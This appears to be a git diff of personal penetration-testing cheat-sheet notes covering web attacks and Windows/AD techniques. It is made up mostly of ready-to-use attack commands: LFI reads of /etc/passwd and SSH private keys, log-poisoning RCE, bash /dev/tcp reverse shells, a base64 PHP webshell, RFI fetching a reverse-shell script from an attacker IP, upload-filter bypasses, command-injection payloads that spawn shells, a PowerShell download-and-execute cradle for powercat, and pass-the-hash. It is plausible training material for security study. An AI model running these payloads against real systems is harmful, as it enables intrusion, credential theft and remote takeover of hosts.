@@ -413,7 +413,7 @@ Kali port:
     `http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd`
     `curl http://192.168.50.16/cgibin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`
   - Inspect: url?**page=**xxx
-  - Connect SSH from stolen private key
+  - **Connect SSH from stolen private key**
     ```
     curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/<username>/.ssh/id_rsa -o dt_key
     chmod 400 dt_key
@@ -423,7 +423,7 @@ Kali port:
   - ⚠️ **Goal: load system files and RCE via log file**   
     `http://target.com/index.php?page=../../../../etc/passwd`
   - Inspect: url?**page=**xxx
-  - Include the log file via LFI  
+  - Include the log file via LFI (write sys cmd to access.log file)
     1. Map env (server & log paths)
        **Linux/Apache: /var/log/apache2/access.log or /var/log/httpd/access_log**
        Windows (XAMPP/Apache): C:\xampp\apache\logs\access.log  
@@ -437,7 +437,7 @@ Kali port:
     7. Include 💣 **reverse shell**    
        `bash -i >& /dev/tcp/<kali>/4444 0>&1` #bash  
        `bash -c "bash -i >& /dev/tcp/<kali>/4444 0>&1"` #bourne shell (sh)  
-       `bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<kali>%2F4444%200%3E%261%22`  #encoding  
+       `bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<kali>%2F4444%200%3E%261%22`  #encoding
   - PHP wrappers  
     - encode the PHP snippet into base64  
       `kali@kali:~$ echo -n '<?php echo system($_GET["cmd"]);?>' | base64`  
@@ -450,7 +450,8 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
   - start kali webshells  
     `kali@kali:/usr/share/webshells/php/$ python3 -m http.server 80`  
   - exploit RFI  
-    `curl "http://mountaindesserts.com/meteor/index.php?page=http://<kali>/simple-backdoor.php&cmd=ls"`
+    `curl "http://mountaindesserts.com/meteor/index.php?page=http://<kali>/simple-backdoor.php&cmd=ls"` OR
+    `curl "http://mountaindesserts.com:8001/meteor/index.php?page=http://192.168.45.221/php-reverse-shell.php"`      
 - **File upload vulnerabilities**    
   - Goal  
     - ⚠️ **upload and execute web shell/RCE-->revere shell**    
@@ -458,10 +459,13 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
     - upload malicious xss (stored XSS)  
   - Inspect: file upload input, request param ?file=upload, API endpoints (upload.php, file_upload)  
   - Bypass
-    - ❗**filename extensions**: .phps, .php7, .pHP, .php5, .phtml
+    - ❗**filename extensions**: .pHP, .phps, .php7, .pHP, .php5, .phtml
     - double extensions: shell.php.jpg, shell.php;.jpg  
     - MIME manipulation: Content-Type: image/png but payload is PHP
-    - null byte injection: `shell.php%00.jpg`  
+    - null byte injection: `shell.php%00.jpg`
+  - Upload an executable files
+    - nano /var/www/html/php-reverse-shell.php (change to kali ip and/or port)
+    - `curl http://<target>/php-reverse-shell.php`  
   - 💣 get **reverse shell**  
     1. start netcat listener from kali  
        `nc -nvlp 4444`
@@ -498,10 +502,19 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
 - **Command injection**
   - ⚠️ **execute web shell/RCE-->revere shell**
   - Inspect: ?page=, ?id=, ?cmd=
-  - detect:   
+  - detect:
+    ```
+    ; id
+    && id
+    $(id)
+    `id`
+    ```
     `(dir 2>&1 *'|echo CMD);&<# rem #>echo PowerShell`          
     `curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://<target>:8000/archive` #send url encoding
-  - 💣 get reverse shell  
+  - 💣 Linux: Bash reverse shell  
+    `curl -X POST http://192.168.203.16/login -d "username=user" -d "password=pass" -d "ffa="&&bash -c 'bash -i >& /dev/tcp/<kali>/4444 0>&1'""`  
+    `curl -X POST http://192.168.203.16/login -d "username=user" -d "password=pass" -d "ffa=%22%26%26bash+-c+'bash+-i+>%26+/dev/tcp/<kali>/4444+0>%261'%22"`  
+  - 💣 Windows: Powercat    
     1. serve Powercat via Python web server  
        `kali@kali:~$ cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .`
     3. start web server  
@@ -510,7 +523,8 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
        `kali@kali:~$ nc -nvlp 4444`
     7. Download Powercat and create a reverse shell via command injection
        `Archive=git;IEX (New-Object System.Net.Webclient).DownloadString("http://<ATTACKER_IP>/powercat.ps1");powercat -c <ATTACKER_IP> -p <PORT> -e powershell`  > send encoding payload  
-       `kali@kali:~$ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F<kali>%2Fpowercat.ps1%22)%3Bpowercat%20-c%20<kali>%20-p%204444%20-e%20powershell' http://<target>:8000/archive`  
+       `kali@kali:~$ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F<kali>%2Fpowercat.ps1%22)%3Bpowercat%20-c%20<kali>%20-p%204444%20-e%20powershell' http://<target>:8000/archive`
+
 - **SQL injection attacks**
   - connect DB  
     MYSQL: `mysql -u root -p'root' -h 192.168.50.16 -P 3306`  
@@ -726,7 +740,25 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
   - Gain access to SERVERWK248 machine as CORP\Administrator (pass the hash)  
     `impacket-wmiexec -debug -hashes 00000000000000000000000000000000:160c0b16dd0ee77e7c494e38252f7ddf CORP/Administrator@192.168.50.248`  
 
-# Remote to other machines
+# Windows Privilege Escalation  
+- Enumerating windows
+  ```
+  whoami
+  
+  whoami /user #S-<Revision>-<IdentifierAuthority>-<SubAuthority1>-<SubAuthority2>-...-<RID>
+  S-1-5-21-2294905130-3135521385-938276-1001
+  
+  whoami /groups
+  Get-LocalGroup
+  Get-LocalUser
+  whoami /priv
+
+  #specific group
+  Get-LocalGroupMember <adminteam>
+  
+  #specific member
+  ```
+- ddd
 
 # Active directory  
 
